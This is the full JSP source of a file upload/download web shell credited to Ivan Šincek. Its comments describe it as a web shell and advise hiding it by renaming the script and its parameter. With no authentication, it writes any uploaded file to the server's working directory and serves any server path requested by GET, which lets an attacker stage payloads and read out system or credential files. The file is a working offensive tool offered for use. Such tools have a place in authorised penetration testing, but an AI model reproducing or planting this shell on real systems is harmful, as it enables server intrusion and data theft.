<%@page import="java.io.File"%>
<%@page import="java.io.IOException"%>
<%@page import="java.io.OutputStream"%>
<%@page import="java.nio.file.Files"%>
<%@page import="java.nio.file.Paths"%>
<%@page import="java.util.List"%>
<%@page import="org.apache.tomcat.util.http.fileupload.disk.DiskFileItemFactory"%>
<%@page import="org.apache.tomcat.util.http.fileupload.FileItem"%>
<%@page import="org.apache.tomcat.util.http.fileupload.servlet.ServletFileUpload"%>
<%@page import="org.apache.tomcat.util.http.fileupload.servlet.ServletRequestContext"%>

<%@page import="java.util.Iterator"%>
<%-- Copyright (c) 2021 Ivan Šincek --%>
<%-- v4.0 --%>
<%-- Requires Java SE v8 or greater, JDK v8 or greater, and Java EE v5 or greater. --%>

<%-- modify the script name and request parameter name to random ones to prevent others form accessing and using your web shell --%>
<%-- when downloading a file, you should URL encode the file path --%>

<%
    // your parameter/key here
    String parameter = "file";
    String output = "", tmp = "";
    if (("post").equalsIgnoreCase(request.getMethod()) && (tmp = request.getContentType()) != null && tmp.startsWith("multipart/form-data")) {
        List<FileItem> files = null;
        try {
            files = new ServletFileUpload(new DiskFileItemFactory()).parseRequest(new ServletRequestContext(request));
            for (FileItem file : files) {
                if (parameter.equals(file.getFieldName())) {
                    tmp = System.getProperty("user.dir") + File.separator + new File(file.getName()).getName();
                    file.write(new File(tmp));
                    output = String.format("SUCCESS: File was uploaded to '%s'\n", tmp);
                    break;
                }
            }
        } catch (IOException ex) {
            output = String.format("ERROR: %s\n", ex.getMessage());
        } finally {
            if (files != null) { files.clear(); }
        }
    }
    if (("get").equalsIgnoreCase(request.getMethod()) && (tmp = request.getParameter(parameter)) != null && (tmp = tmp.trim()).length() > 0) {
        try (
                OutputStream stream = response.getOutputStream();
            ) {
            response.setHeader("Content-Type", "application/octet-stream");
            response.setHeader("Content-Disposition", String.format("attachment; filename=\"%s\"", new File(tmp).getName()));
            stream.write(Files.readAllBytes(Paths.get(tmp)));
            stream.flush();
        } catch (IOException ex) {
            output = String.format("ERROR: %s\n", ex.getMessage());
        }
    }
    tmp = null;
    // if you do not want to use the whole HTML as below, uncomment this line and delete the whole HTML
    // out.print("<pre>" + output + "</pre>"); output = null; System.gc();
%>

<%@page contentType="text/html" pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>JSP File Upload/Download</title>
        <meta name="author" content="Ivan Šincek">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
    </head>
    <body>
        <form method="post" enctype="multipart/form-data" action=".<%= request.getServletPath() %>">
            <input name="<%= parameter %>" type="file" required="required">
            <input type="submit" value="Upload">
        </form>
        <pre><%= output %></pre>
    </body>
</html>
<% output = null; System.gc(); %>
